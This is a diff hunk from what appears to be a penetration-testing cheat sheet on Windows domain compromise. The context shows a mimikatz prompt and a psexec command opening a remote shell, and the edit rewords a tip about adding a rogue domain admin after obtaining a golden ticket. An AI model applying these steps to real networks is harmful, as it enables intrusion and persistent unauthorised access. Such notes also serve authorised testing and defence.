@@ -59,7 +59,7 @@ mimikatz # misc::cmd
 
 > psexec.exe \\<name_of_machine_in_the_domain> cmd.exe
 
-[you can also add a new admin user to the domain for persistence]
+[after obtaining a golden ticket, you can also add a new admin user to the domain for persistence]
 
 
 
